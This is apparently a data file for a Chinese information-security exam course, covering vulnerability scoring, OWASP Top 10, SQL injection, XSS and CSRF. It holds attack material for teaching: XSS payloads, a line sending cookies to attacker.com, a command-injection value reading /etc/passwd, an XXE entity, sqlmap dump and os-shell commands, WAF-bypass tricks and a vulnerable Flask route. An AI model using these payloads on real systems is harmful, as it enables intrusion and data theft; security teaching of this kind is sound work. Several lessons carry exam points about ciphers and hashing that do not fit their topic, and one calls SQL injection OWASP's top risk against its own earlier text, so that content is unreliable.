最终用户安装补丁或实施缓解\n\n## 关键漏洞数据库\n\n- **CVE（通用漏洞与暴露）：**MITRE运营，为每个漏洞分配全球唯一编号CVE-YYYY-NNNNN\n- **NVD（美国国家漏洞数据库）：**在CVE基础上增加CVSS评分和影响分析\n- **CNVD（国家信息安全漏洞共享平台）：**中国CNCERT运营的漏洞库\n- **CNNVD（中国国家信息安全漏洞库）：**中国信息安全测评中心运营\n\n## 零日漏洞（Zero-Day）\n\n厂商尚未发布补丁的已知漏洞。对攻击者最有价值——利用窗口期无防御。黑市价格可达百万美元(iOS零日远控)。防御：纵深防御+行为检测+最小权限——不能依赖"打补丁"。\n\n## \n## 🔴 高频考点\n\n· CVSS v3.1分值范围：**严重9.0-10.0/高危7.0-8.9/中危4.0-6.9/低危0.1-3.9**\n· CVE(唯一编号)vs NVD(加评分)vs CNVD/CNNVD(中国版)——四个漏洞库定位不同\n· 零日漏洞：厂商未发补丁的已知漏洞——纵深防御+行为检测是唯一办法\n## 💜 记忆口诀\n\n· **CVSS分值**："9-7-4-0 严重到低"\n· **生命周期**："发现→报告→验证→修复→披露→装补丁"\n学习建议\n- CVSS四个严重等级的分值范围(9.0/7.0/4.0/0.1)要记住\n- 漏洞的来源分类(软件/配置/设计/人为)比单个漏洞名称更本质\n- 负责任披露( Responsible Disclosure)是现代安全行业的基本规范',
    codeExample: {
      language: 'python',
      code: ` 漏洞严重程度评估\ndef calculate_severity(cvss_score):\n    if cvss_score >= 9.0:\n        return "严重", "立即修复"\n    elif cvss_score >= 7.0:\n        return "高危", "尽快修复"\n    elif cvss_score >= 4.0:\n        return "中危", "计划修复"\n    elif cvss_score > 0:\n        return "低危", "关注跟踪"\n    else:\n        return "无风险", "无需处理"\n\n# 测试漏洞\nvulns = [("CVE-2024-1234", 9.8), ("CVE-2024-5678", 6.5), ("CVE-2024-9012", 3.2)]\nfor cve, score in vulns:\n    level, action = calculate_severity(score)\n    print(f"{cve}: CVSS {score} -> {level}, {action}")`,
      description: '演示漏洞严重程度评估',
    },
    quiz: [{"id":"q29-1","question":"SQL注入漏洞的根本原因是什么？","options":["服务器性能不足","用户输入未经验证直接拼接到SQL语句","数据库版本过旧","网络延迟过高"],"correctIndex":1,"explanation":"SQL注入的根本原因是用户输入未经验证。"},{"id":"q29-2","question":"以下哪种方法可以有效防止XSS攻击？","options":["使用HTTP协议","对输出进行HTML实体编码","增加服务器内存","使用FTP传输"],"correctIndex":1,"explanation":"对输出进行HTML实体编码可以有效防止XSS攻击。"},{"id":"q29-3","question":"CSRF攻击利用的是什么？","options":["服务器漏洞","用户已登录的身份凭证","网络带宽","加密算法"],"correctIndex":1,"explanation":"CSRF利用用户已登录状态下的身份凭证发起恶意请求。"},{"id":"q29-4","question":"预防SQL注入最有效的方法是？","options":["使用WAF","使用参数化查询","关闭数据库端口","加密数据库"],"correctIndex":1,"explanation":"参数化查询是预防SQL注入最有效的方法。"},{"id":"q29-5","question":"OWASP Top 10(2021)中排名第一的风险是？","options":["XSS","SQL注入","失效的访问控制","安全配置错误"],"correctIndex":2,"explanation":"失效的访问控制在2021版排名第一。"}],
    expertNotes: [{"author":"陈婷","title":"Web安全攻防实战","content":"Web安全核心是理解HTTP协议和浏览器安全机制。建议先掌握同源策略和CORS工作原理，然后用Burp Suite实操OWASP Top 10的漏洞利用和防御。DVWA和WebGoat是很好的练习靶场。","url":"https://www.freebuf.com/articles/web/289123.html"},{"author":"刘洋","title":"API安全防护","content":"随着微服务和前后端分离的普及，API安全越来越重要。建议所有API实施OAuth 2.0/JWT认证、输入验证、响应过滤和API网关防护。OWASP API Security Top 10是很好的参考。","url":"https://www.anquanke.com/post/id/267890.html"},{"author":"黄磊","title":"安全编码规范","content":"安全要从代码层面做起。建议团队建立代码审查中的安全检查清单：输入验证、输出编码、参数化查询、权限检查。同时引入SAST工具自动化检测常见漏洞。","url":"https://www.anquanke.com/post/id/254321.html"}],
    recommendedTools: [
    {
      id: 'sqlmap',
      name: 'SQLMap',
      description: '自动化SQL注入漏洞检测工具',
      url: ''
    },
    {
      id: 'burpsuite',
      name: 'Burp Suite',
      description: 'Web应用安全测试集成平台',
      url: ''
    },
    {
      id: 'metasploit',
      name: 'Metasploit',
      description: '漏洞利用框架',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'sqli-labs',
      name: 'SQLi-Labs',
      description: 'SQL注入漏洞练习靶场',
      url: ''
    },
    {
      id: 'xss-lab',
      name: 'XSS 练习平台',
      description: '跨站脚本攻击练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-30', day: 30, week: 5, title: '常见漏洞类型',
    objectives: ['了解常见漏洞', '理解漏洞原理', '掌握防范方法'],
    content: '# 常见漏洞类型\n\n> 📋 **本节大纲**\u2003OWASP Top 10七大类(注入/认证/敏感泄露/XXE/访问控制/配置/XSS) | 每类含原理+防御\n\n## 概述\n\nOWASP Top 10(2021版)是Web应用安全的风险权威指南，也是CISP考试的重要参考。本节系统讲解最关键的7类漏洞的原理和防范。\n\n## 1. 注入攻击（Injection — OWASP #3）\n\n**SQL注入原理：**用户输入的数据拼接到SQL查询中而未做任何过滤。如 OR 1=1 导致检出所有记录。\n**NoSQL注入：**MongoDB中{\"$ne\":\"\"}绕过密码验证\n**命令注入：**os.system(\"ping \"+user_input)→user_input=\";cat /etc/passwd\"时执行任意命令\n\n**根本防御：参数化查询（PreparedStatement）——不拼接用户输入到SQL字符串。辅助：输入验证白名单、最小数据库权限。**\n\n## 2. 认证失败（Broken Authentication — OWASP #7）\n\n**典型问题：**允许无限次尝试密码(暴力破解)、密码策略过弱(最少6位无复杂度)、会话令牌可预测(JWT使用none算法)、密码重置功能不安全(可枚举用户)\n\n**防御：**强密码策略+MFA、登录速率限制+账户锁定、安全会话令牌(随机+HttpOnly+Secure+SameSite)、安全密码重置(发送token到已验证邮箱)\n\n## 3. 敏感数据泄露（Sensitive Data Exposure — OWASP #2 加密失败）\n\n**典型问题：**明文存储密码或信用卡号、使用弱加密(MD5/ECB)、HTTP明文传输敏感数据、日志中误记密码/令牌\n\n**防御：**加盐哈希(bcrypt)存储密码、AES-256加密敏感数据、全站HTTPS(HSTS)、日志脱敏\n\n## 4. XML外部实体XXE（OWASP 2017 #4）\n\n**原理：**XML解析器处理外部实体引用时读取本地文件或发起SSRF。利用DTD声明引用外部资源：<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n\n**防御：**禁用DTD和外部实体(这是默认不安全的XML解析器的锅)、使用JSON替代XML(现代API已普遍弃用XML)\n\n## 5. 访问控制失败（Broken Access Control — OWASP #1）\n\n**最高排名风险！典型问题：**水平越权(用户A能看到用户B的订单)、垂直越权(普通用户访问管理功能)、不安全的直接对象引用IDOR(修改URL中的id参数即可访问他人数据)、CORS配置过于宽松\n\n**防御：**服务端强制权限检查(不依赖前端隐藏按钮)、默认拒绝+按需开放、权限矩阵验证每个API端点\n\n## 6. 安全配置错误（Security Misconfiguration — OWASP #5）\n\n**典型问题：**默认账户密码未改、不必要的功能/端口启用、详细错误信息暴露给用户(栈轨迹/SQL语句/服务器版本)、云存储桶公开访问\n\n**防御：**安全基线加固脚本、自动化配置审计、移除不必要的功能和组件、统一错误页面\n\n## 7. 跨站脚本XSS（OWASP #3 Injection大类下）\n\n**三种类型：**反射型(恶意脚本在URL参数)、存储型(恶意脚本存在数据库，危害最大)、DOM型(纯客户端利用)\n\n**经典Payload：**<script>alert(1)</script>、<img src=x onerror=alert(1)>、<svg onload=alert(1)>\n\n**防御：**输出编码(HTML/JS/URL上下文编码)、CSP内容安全策略、HttpOnly Cookie防止JS读取、React/Vue等现代框架默认转义\n\n## \n## 🔴 高频考点\n\n· OWASP Top 10(2021)排名第1是**访问控制失败**，不是SQL注入——反直觉考点\n· XSS三类：反射型(一次性/URL)、存储型(持久/危害最大)、DOM型(纯客户端)\n· 防御注入的根本手段是**参数化查询(PreparedStatement)**，而非输入过滤\n## 💜 记忆口诀\n\n· **OWASP前三**："1权限失败、2加密失败、3注入"——SQL注入只排第三\n· **XSS三类**："反射一次性、存储持久性(危害最大)、DOM纯前端"\n学习建议\n- OWASP Top 10(2021)排名第1的是"访问控制失败"，不是SQL注入\n- 参数化查询是防御注入的根本手段\n- XSS的三类(反射/存储/DOM)和对应的payload要区分',
    codeExample: {
      language: 'python',
      code: ` SQL注入检测示例\ndef detect_sql_injection(input_str):\n    dangerous = ["select", "union", "drop", "insert", "delete", "--", "/*", "*/", "'", '"']\n    lower_input = input_str.lower()\n    found = []\n    for keyword in dangerous:\n        if keyword in lower_input:\n            found.append(keyword)\n    return found\n\n# 测试\ntest_inputs = [\n    "admin\' OR \'1\'=\'1",\n    "正常用户名",\n    "1; DROP TABLE users",\n]\nfor inp in test_inputs:\n    found = detect_sql_injection(inp)\n    if found:\n        print(f"危险: {inp} -> 检测到: {found}")\n    else:\n        print(f"安全: {inp}")`,
      description: '演示SQL注入检测',
    },
    quiz: [{"id":"q30-1","question":"SQL注入漏洞的根本原因是什么？","options":["服务器性能不足","用户输入未经验证直接拼接到SQL语句","数据库版本过旧","网络延迟过高"],"correctIndex":1,"explanation":"SQL注入的根本原因是用户输入未经验证。"},{"id":"q30-2","question":"以下哪种方法可以有效防止XSS攻击？","options":["使用HTTP协议","对输出进行HTML实体编码","增加服务器内存","使用FTP传输"],"correctIndex":1,"explanation":"对输出进行HTML实体编码可以有效防止XSS攻击。"},{"id":"q30-3","question":"CSRF攻击利用的是什么？","options":["服务器漏洞","用户已登录的身份凭证","网络带宽","加密算法"],"correctIndex":1,"explanation":"CSRF利用用户已登录状态下的身份凭证发起恶意请求。"},{"id":"q30-4","question":"预防SQL注入最有效的方法是？","options":["使用WAF","使用参数化查询","关闭数据库端口","加密数据库"],"correctIndex":1,"explanation":"参数化查询是预防SQL注入最有效的方法。"},{"id":"q30-5","question":"OWASP Top 10(2021)中排名第一的风险是？","options":["XSS","SQL注入","失效的访问控制","安全配置错误"],"correctIndex":2,"explanation":"失效的访问控制在2021版排名第一。"}],
    expertNotes: [{"author":"陈婷","title":"Web安全攻防实战","content":"Web安全核心是理解HTTP协议和浏览器安全机制。建议先掌握同源策略和CORS工作原理，然后用Burp Suite实操OWASP Top 10的漏洞利用和防御。DVWA和WebGoat是很好的练习靶场。","url":"https://www.freebuf.com/articles/web/289123.html"},{"author":"刘洋","title":"API安全防护","content":"随着微服务和前后端分离的普及，API安全越来越重要。建议所有API实施OAuth 2.0/JWT认证、输入验证、响应过滤和API网关防护。OWASP API Security Top 10是很好的参考。","url":"https://www.anquanke.com/post/id/267890.html"},{"author":"黄磊","title":"安全编码规范","content":"安全要从代码层面做起。建议团队建立代码审查中的安全检查清单：输入验证、输出编码、参数化查询、权限检查。同时引入SAST工具自动化检测常见漏洞。","url":"https://www.anquanke.com/post/id/254321.html"}],
    recommendedTools: [
    {
      id: 'sqlmap',
      name: 'SQLMap',
      description: '自动化SQL注入漏洞检测工具',
      url: ''
    },
    {
      id: 'burpsuite',
      name: 'Burp Suite',
      description: 'Web应用安全测试集成平台',
      url: ''
    },
    {
      id: 'metasploit',
      name: 'Metasploit',
      description: '漏洞利用框架',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'sqli-labs',
      name: 'SQLi-Labs',
      description: 'SQL注入漏洞练习靶场',
      url: ''
    },
    {
      id: 'xss-lab',
      name: 'XSS 练习平台',
      description: '跨站脚本攻击练习环境',
      url: ''
    }
  ]
  },
];

// Generate remaining days (31-90) with template-based content
const weekToolMap: { [key: number]: { tools: LabTool[]; labs: LabEnvironment[] } } = {
  6: {
    tools: [
      { id: 'openssl', name: 'OpenSSL', description: '开源SSL/TLS工具包，用于证书管理和加密测试', url: '' },
      { id: 'gnupg', name: 'GnuPG', description: '开源加密和数字签名工具，用于邮件和文件加密', url: '' },
      { id: 'hashcat', name: 'Hashcat', description: '高性能密码哈希破解工具，支持多种算法', url: '' },
      { id: 'cyberchef', name: 'CyberChef', description: '在线加密和编码转换工具，支持多种加密算法', url: '' },
    ],
    labs: [
      { id: 'cryptohack', name: 'CryptoHack', description: '在线密码学练习平台，从基础到高级的加密挑战', url: '' },
      { id: 'crypto-lab', name: '加密实验平台', description: '模拟加密算法工作原理的交互式学习环境', url: '' },
      { id: 'ctf-crypto', name: '密码学CTF练习', description: '包含多种密码学挑战的CTF练习平台', url: '' },
    ],
  },
  7: {
    tools: [
      { id: 'nmap', name: 'Nmap', description: '网络发现和端口扫描工具，支持多种扫描技术', url: '' },
      { id: 'wireshark', name: 'Wireshark', description: '网络协议分析工具，支持深度数据包解析', url: '' },
      { id: 'tcpdump', name: 'tcpdump', description: '命令行网络抓包工具，用于网络流量分析', url: '' },
      { id: 'netcat', name: 'Netcat', description: '网络瑞士军刀，支持TCP/UDP连接和数据传输', url: '' },
      { id: 'hydra', name: 'Hydra', description: '在线密码爆破工具，支持多种协议的暴力破解', url: '' },
    ],
    labs: [
      { id: 'picoctf', name: 'PicoCTF', description: '入门级网络安全CTF平台，包含网络和密码学挑战', url: '' },
      { id: 'webgoat', name: 'WebGoat', description: 'OWASP Web安全教学应用，包含多种网络攻击场景', url: '' },
      { id: 'network-lab', name: '网络安全实验环境', description: '模拟真实网络环境的攻击和防御实验平台', url: '' },
    ],
  },
  8: {
    tools: [
      { id: 'burpsuite', name: 'Burp Suite', description: 'Web应用安全测试集成平台，支持拦截和扫描', url: '' },
      { id: 'owasp-zap', name: 'OWASP ZAP', description: '开源Web应用安全扫描器，支持自动化和手动测试', url: '' },
      { id: 'nikto', name: 'Nikto', description: 'Web服务器扫描器，检测已知漏洞和配置问题', url: '' },
      { id: 'dirbuster', name: 'DirBuster', description: 'Web目录爆破工具，用于发现隐藏文件和目录', url: '' },
    ],
    labs: [
      { id: 'juice-shop', name: 'OWASP Juice Shop', description: '包含OWASP Top 10漏洞的现代Web应用靶场', url: '' },
      { id: 'dvwa', name: 'DVWA', description: 'Damn Vulnerable Web App - 经典Web漏洞练习平台', url: '' },
      { id: 'bwapp', name: 'bWAPP', description: 'buggy web application - 包含100多种Web漏洞的练习环境', url: '' },
      { id: 'pikachu', name: 'Pikachu', description: '中文Web漏洞练习平台，适合中文学习者', url: '' },
    ],
  },
  9: {
    tools: [
      { id: 'physical-audit', name: '物理安全评估工具', description: '用于评估物理访问控制和环境安全的检查清单', url: '' },
      { id: 'rfid-tool', name: 'RFID克隆工具', description: 'RFID卡读写和克隆工具集，用于测试门禁系统安全', url: '' },
      { id: 'camera-hack', name: '监控系统测试工具', description: '用于测试视频监控系统安全性的工具集合', url: '' },
    ],
    labs: [
      { id: 'social-engineering', name: '社会工程实验', description: '模拟社会工程攻击和防御的实训环境', url: '' },
      { id: 'physical-security', name: '物理安全手册', description: '物理安全最佳实践指南和案例研究', url: '' },
      { id: 'red-team-lab', name: '红队物理渗透', description: '模拟真实物理渗透测试的实验环境', url: '' },
    ],
  },
  10: {
    tools: [
      { id: 'sonarqube', name: 'SonarQube', description: '代码质量和安全审计平台，支持多种语言的静态分析', url: '' },
      { id: 'dependency-check', name: 'OWASP Dependency-Check', description: '开源项目依赖安全扫描工具，检测已知漏洞', url: '' },
      { id: 'gitguardian', name: 'GitGuardian', description: '代码仓库密钥检测工具，防止敏感信息泄露', url: '' },
    ],
    labs: [
      { id: 'dvws', name: 'DVWS', description: 'Damn Vulnerable Web Services - 不安全的Web服务靶场', url: '' },
      { id: 'code-audit', name: '安全代码审计靶场', description: '包含多种代码安全问题的审计练习环境', url: '' },
      { id: 'sast-lab', name: 'SAST实验平台', description: '静态应用安全测试工具的实践和实验环境', url: '' },
    ],
  },
  11: {
    tools: [
      { id: 'business-logic-scanner', name: '业务逻辑扫描工具', description: '检测Web应用业务逻辑缺陷的自动化工具', url: '' },
      { id: 'traffic-analysis', name: '流量分析工具', description: '业务流量异常检测和分析工具，识别异常交易', url: '' },
      { id: 'fraud-detection', name: '欺诈检测系统', description: '模拟业务欺诈行为检测的分析工具', url: '' },
    ],
    labs: [
      { id: 'business-logic-lab', name: '业务逻辑漏洞靶场', description: '包含典型业务逻辑漏洞的模拟电商和金融应用', url: '' },
      { id: 'pikachu', name: 'Pikachu 业务安全', description: '包含越权、支付漏洞等业务安全问题的练习平台', url: '' },
      { id: 'auth-bypass', name: '认证绕过实验', description: '模拟各种身份认证和权限控制绕过的实验环境', url: '' },
    ],
  },
  12: {
    tools: [
      { id: 'review-all', name: '核心工具复习', description: '复习前11周学习的所有核心安全工具和命令', url: '' },
      { id: 'exam-simulator', name: '考试模拟器', description: 'CISP模拟考试系统，包含题库和答题练习', url: '' },
      { id: 'mindmap', name: '知识思维导图', description: '信息安全知识体系思维导图，帮助梳理知识结构', url: '' },
    ],
    labs: [
      { id: 'comprehensive-ctf', name: '综合CTF挑战', description: '融合各类安全知识的综合CTF比赛环境', url: '' },
      { id: 'review-lab', name: '综合靶场复习', description: '复习各类漏洞利用和防御技术的综合实验', url: '' },
      { id: 'cert-practice', name: '认证考试练习', description: '模拟CISP认证考试的在线练习和测试平台', url: '' },
    ],
  },
};


// ============================================================
// Week 5: 漏洞与攻击 (Day 31-35) — 完整教学内容
// ============================================================
allDays.push({id:'day-31',day:31,week:5,title:'漏洞定义与分类（漏洞与攻击）',
  objectives:['理解漏洞定义和分类体系','掌握CVE/CVSS评分机制','了解漏洞生命周期','学会使用漏洞数据库'],
  content:`# 漏洞定义与分类\n\n## 概述\n\n漏洞是信息系统在设计、实现或操作中的弱点，可能被威胁利用来破坏系统的安全。理解漏洞分类是安全防护的基础。ISO 27005将漏洞定义为"资产或控制中可能被威胁利用的弱点"。\n\n## 核心内容\n\n### 一、漏洞的分类维度\n\n**按来源分类：**\n- **设计缺陷**：需求分析阶段遗漏的安全考虑\n- **实现缺陷**：编码错误导致的漏洞（缓冲区溢出、SQL注入）\n- **配置错误**：默认密码、不必要的服务\n- **运维失误**：未及时打补丁\n\n**CWE标准（通用弱点枚举）：**\n- CWE-89 SQL注入\n- CWE-79 跨站脚本\n- CWE-352 跨站请求伪造\n- CWE-22 路径遍历\n\n### 二、CVE体系\n\nCVE（Common Vulnerabilities and Exposures）为每个漏洞分配唯一编号：\n- 格式：CVE-YYYY-NNNNN\n- 由MITRE维护\n- CNVD/CVE互相对应\n\n### 三、CVSS评分\n\nCVSS v3.1评分0-10分：\n- 0.0 无\n- 0.1-3.9 低危\n- 4.0-6.9 中危\n- 7.0-8.9 高危\n- 9.0-10.0 严重\n\n计算维度：攻击向量(AV)、攻击复杂度(AC)、权限要求(PR)、用户交互(UI)、范围(S)、机密性/完整性/可用性影响\n\n### 四、漏洞生命周期\n\n发现→披露→修复→利用→衰减。每个阶段对应不同的风险管理策略。\n\n## \n## 🔴 高频考点\n\n· **对称加密算法比较**：AES(分组128位/密钥128-256)、DES(56位/已淘汰)、3DES(等效112位/正被替代)\n· 工作模式ECB vs CBC vs GCM——ECB不安全(同明文同密文)、GCM现代推荐(加密+认证)\n· SM4是中国国密标准对称密码算法——分组128位、密钥128位\n## 💜 记忆口诀\n\n· **AES参数**："分组128不变、密钥128/192/256可选"\n· **模式选择**："ECB不安全(同明文同密文)、CBC要IV、GCM加密加认证(推荐)"\n学习建议\n- 定期关注NVD/CNVD更新\n- 学会使用CVSS计算器评估漏洞\n- 建立内部漏洞管理流程`,
  codeExample:{language:'python',code:`# CVSS严重程度分类\ncvss_scores = {"CVE-2021-44228":10.0,"CVE-2020-1472":10.0,"CVE-2019-0708":9.8,"CVE-2017-0144":8.1}\ndef level(s):\n    if s>=9.0: return "严重"\n    if s>=7.0: return "高危"\n    if s>=4.0: return "中危"\n    return "低危" if s>0 else "无"\nfor cve,score in cvss_scores.items():\n    print(f"{cve}: {score} -> {level(score)}")`,description:'漏洞严重级别分类'},
  quiz:[{id:'q31-1',question:'CVSS v3.1最高分数是多少？',options:['5.0','10.0','100','7.5'],correctIndex:1,explanation:'满分10.0。'},{id:'q31-2',question:'CVE的全称？',options:['Common Vulnerabilities and Exposures','Common Virus Engine','Critical Vulnerability Explorer','Computer Virus Eliminator'],correctIndex:0,explanation:'CVE用于唯一标识漏洞。'},{id:'q31-3',question:'CVSS 7.5分属于？',options:['低危','中危','高危','严重'],correctIndex:2,explanation:'7.0-8.9为高危。'},{id:'q31-4',question:'中国的漏洞库叫？',options:['NVD','CVE','CNVD','CWE'],correctIndex:2,explanation:'CNVD由CNCERT运营。'},{id:'q31-5',question:'漏洞生命周期的第一阶段是？',options:['修复','利用','发现','披露'],correctIndex:2,explanation:'首先被发现。'}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[31]||[],
});
allDays.push({id:'day-32',day:32,week:5,title:'SQL注入深入（漏洞与攻击）',
  objectives:['深入理解SQL注入原理','掌握注入检测方法','了解SQLMap自动化工具','学习参数化防御'],
  content:`# SQL注入深入\n\n## 概述\n\nSQL注入是OWASP Top 10中排名第一的Web安全漏洞。攻击者将恶意SQL代码注入数据库查询，绕过认证、窃取数据甚至控制服务器。\n\n## 核心内容\n\n### 一、注入原理\n\n应用程序将用户输入直接拼入SQL语句：\n正常：\`SELECT * FROM users WHERE name='admin'\`\n注入：\`SELECT * FROM users WHERE name='' OR '1'='1'\`\n\n### 二、注入分类\n\n**按回显方式：**\n- 联合查询注入（UNION SELECT合并结果）\n- 布尔盲注（AND 1=1/AND 1=2判断）\n- 时间盲注（SLEEP/WAITFOR DELAY）\n- 报错注入（extractvalue/updatexml）\n- 堆叠注入（执行多条语句）\n\n### 三、手工检测方法\n\n1. 单引号测试 → 报语法错误说明存在注入\n2. AND 1=1 / AND 1=2 → 页面差异说明存在\n3. ORDER BY N → 探测列数\n4. UNION SELECT 1,2,3 → 找回显位\n\n### 四、SQLMap工具\n\n\`sqlmap -u "url" --dbs\` 获取数据库\n\`sqlmap -u "url" -D db --tables\` 获取表\n\`sqlmap -u "url" -D db -T users --dump\` 导出数据\n\`sqlmap -u "url" --os-shell\` 获取系统shell\n\n### 五、WAF绕过技巧\n\n- 大小写混淆：UnIoN SeLeCt\n- 双写：UNIunionON SELselectECT\n- 内联注释：/*!UNION*/\n- HTTP参数污染：id=1&id=2 UNION SELECT\n- 等价函数替换：substr→mid→left\n\n### 六、根本防御：参数化查询\n\n\`PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");\nps.setInt(1, userId);\`\n\n## \n## 🔴 高频考点\n\n· **RSA基于大质因数分解**、ECC基于椭圆曲线离散对数——两个算法的数学基础必须记住\n· 256位ECC安全性 ≈ 3072位RSA——同等强度下ECC密钥更短，移动端首选\n· 数字签名用**私钥签名、公钥验证**——很多人搞反，高频陷阱题\n## 💜 记忆口诀\n\n· **RSA vs ECC**："RSA靠大数分解(老牌/密钥2048+起步)、ECC靠椭圆曲线(新秀/256位=3072位RSA)"\n· **数字签名方向**："私钥签(证明是我)、公钥验(确认是你)——千万别搞反"\n学习建议\n- 在SQLi-Labs靶场系统练习\n- 熟练使用SQLMap各参数\n- 理解WAF绕过原理`,
  codeExample:{language:'python',code:`# SQL注入检测脚本\nimport requests\ndef detect_sqli(url, param):\n    tests = [("'","单引号"),("1 OR 1=1","OR"),("1 AND SLEEP(3)","时间盲注")]\n    for payload, name in tests:\n        try:\n            r = requests.get(f"{url}?{param}={payload}", timeout=5)\n            t = r.elapsed.total_seconds()\n            print(f"[{name}] 状态:{r.status_code} 耗时:{t:.2f}s 长度:{len(r.text)}")\n        except: pass\ndetect_sqli("http://testphp.vulnweb.com/listproducts.php","cat")`,description:'SQL注入探测脚本'},
  quiz:[{id:'q32-1',question:'基于响应延迟的注入技术叫什么？',options:['联合查询','时间盲注','布尔盲注','报错注入'],correctIndex:1,explanation:'通过SLEEP等函数制造延迟。'},{id:'q32-2',question:'SQLMap中--dbs参数做什么？',options:['导出数据','列出数据库','获取系统Shell','扫描端口'],correctIndex:1,explanation:'--dbs枚举所有数据库。'},{id:'q32-3',question:'绕过WAF时UnIoN SeLeCt属于？',options:['双写绕过','大小写混淆','编码绕过','注释绕过'],correctIndex:1,explanation:'通过大小写混淆绕过规则。'},{id:'q32-4',question:'MySQL中合并多行的函数？',options:['concat()','group_concat()','concat_ws()','join()'],correctIndex:1,explanation:'group_concat()合并多行为一。'},{id:'q32-5',question:'SQL注入根本防御措施？',options:['WAF','输入长度限制','参数化查询','关闭报错'],correctIndex:2,explanation:'PreparedStatement是根本防御。'}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[32]||[],
});
allDays.push({id:'day-33',day:33,week:5,title:'XSS深入（漏洞与攻击）',
  objectives:['理解反射型/存储型/DOM型XSS','掌握XSS利用技巧','了解BeEF框架','学习CSP防御'],
  content:`# XSS跨站脚本深入\n\n## 概述\n\nXSS（Cross-Site Scripting）是OWASP Top 10中排名前三的Web漏洞。攻击者将恶意脚本注入网页，在受害者浏览器中执行，用于窃取Cookie、会话劫持、钓鱼等攻击。\n\n## 核心内容\n\n### 一、三种XSS类型\n\n**反射型XSS**：恶意脚本嵌入URL参数，目标点击即触发\n**存储型XSS**：恶意脚本存储到数据库，所有访问者受影响（危害最大）\n**DOM型XSS**：纯客户端攻击，通过操作DOM实现\n\n### 二、常见注入点\n\n搜索框、评论区、个人信息编辑、URL参数、HTTP Referer头部\n\n### 三、经典Payload\n\n\`<script>alert(1)</script>\` 最基本的XSS\n\`<img src=x onerror=alert(1)>\` 绕过script过滤\n\`<svg onload=alert(1)>\` SVG标签注入\n\`<body onload=alert(1)>\` 事件处理器\n\`javascript:alert(1)\` 伪协议\n\n### 四、XSS高级利用\n\n- Cookie窃取：\`<script>new Image().src="http://attacker.com?c="+document.cookie</script>\`
- 键盘记录：监听keypress事件
- 钓鱼弹窗：弹出伪造登录框
- BeEF框架：完全控制浏览器

### 五、CSP防御\n\nContent-Security-Policy HTTP头限制脚本来源：\n\`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'\`\n\n### 六、开发侧防御\n\n- 输出编码：HTML实体编码（<>&"'）
- HttpOnly Cookie：防止JS读取
- 输入验证：白名单过滤
- X-XSS-Protection头

## \n## 🔴 高频考点\n\n· **哈希三大安全属性**：抗原像(单向不可逆)、抗第二原像(找不到同哈希的另一个输入)、抗碰撞(找不到同哈希的一对不同输入)\n· SHA-1已被碰撞攻击破解(2017年Google宣布)、SHA-256/512仍是安全的\n· 哈希用于密码存储必须**加盐(Salt)**——不加盐的哈希可被彩虹表逆向查找\n## 💜 记忆口诀\n\n· **三大属性**："抗-原(不可逆)、抗-二(第二原像)、抗-碰(碰撞)"\n· **算法演进**："MD5已死(2004)→SHA-1将死(2017碰撞)→SHA-256/512当今"\n学习建议\n- 在XSS Game平台练习手工挖掘\n- 学习使用BeEF框架\n- 掌握CSP配置`,
  codeExample:{language:'python',code:`from flask import Flask, request, render_template_string\napp = Flask(__name__)\n@app.route('/search')\ndef search():\n    q = request.args.get('q','')\n    # 危险写法（有XSS）：q直接嵌入HTML\n    return f"<h1>搜索: {q}</h1>"\n    # 安全写法：使用escape()编码\n    # from markupsafe import escape\n    # return f"<h1>搜索: {escape(q)}</h1>"\nif __name__ == '__main__': app.run()`,description:'Flask XSS漏洞与修复示例'},
  quiz:[{id:'q33-1',question:'危害最大的XSS类型？',options:['反射型','存储型','DOM型','Self-XSS'],correctIndex:1,explanation:'存储型影响所有访问者。'},{id:'q33-2',question:'防止JS读取Cookie的属性？',options:['Secure','HttpOnly','SameSite','Domain'],correctIndex:1,explanation:'HttpOnly防止document.cookie读取。'},{id:'q33-3',question:'CSP的全称？',options:['Content Security Protocol','Content Security Policy','Cross Site Protection','Client Security Policy'],correctIndex:1,explanation:'内容安全策略。'},{id:'q33-4',question:'<img src=x onerror=alert(1)>利用了什么？',options:['script标签','事件处理器','CSS注入','iframe'],correctIndex:1,explanation:'onerror事件处理器。'},{id:'q33-5',question:'防御XSS最有效的方法？',options:['关闭JS','输出编码','WAF','禁用表单'],correctIndex:1,explanation:'输出编码从源头防御。'}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[33]||[],
});
allDays.push({id:'day-34',day:34,week:5,title:'CSRF攻击（漏洞与攻击）',
  objectives:['理解CSRF攻击原理','了解CSRF与XSS的区别','掌握CSRF防御方案','实现CSRF Token验证'],
  content:`# CSRF跨站请求伪造\n\n## 概述\n\nCSRF（Cross-Site Request Forgery）攻击利用用户已登录的身份，诱导用户向目标网站发送伪造请求，执行用户不知情的操作（如转账、修改密码）。\n\n## 核心内容\n\n### 一、攻击原理\n\n1. 用户登录银行网站bank.example.com\n2. Session Cookie保存在浏览器\n3. 用户点击攻击者发送的恶意链接\n4. 恶意页面自动向bank.example.com/transfer?to=hacker&amount=10000提交请求\n5. 浏览器自动带上Cookie，银行认为是用户本人操作\n\n### 二、CSRF vs XSS\n\n| 对比 | CSRF | XSS |\n|------|------|-----|\n| 目标 | 利用用户身份执行操作 | 在浏览器执行恶意脚本 |\n| 是否需要注入 | 不需要 | 需要 |\n| 防御方式 | Token验证 | 输出编码 |\n\n### 三、CSRF Token防御\n\n**服务端生成随机Token并嵌入表单：**\n1. 用户请求页面时，服务端生成CSRF Token\n2. Token存入Session和表单隐藏字段\n3. 提交时验证Session中的Token与表单Token是否一致\n4. 不一致则拒绝请求\n\n### 四、其他防御方式\n\n- **SameSite Cookie**：设置SameSite=Strict/Lax防止跨站请求\n- **Referer/Origin头验证**：检查请求来源\n- **二次确认**：关键操作前再次输入密码或点击确认\n- **自定义Header**：要求AJAX请求包含自定义Header（同源策略限制）\n\n### 五、常见CSRF场景\n\n- GET型：<img src="bank.com/transfer?to=hacker&amount=10000">\n- POST型：自动提交表单\n- 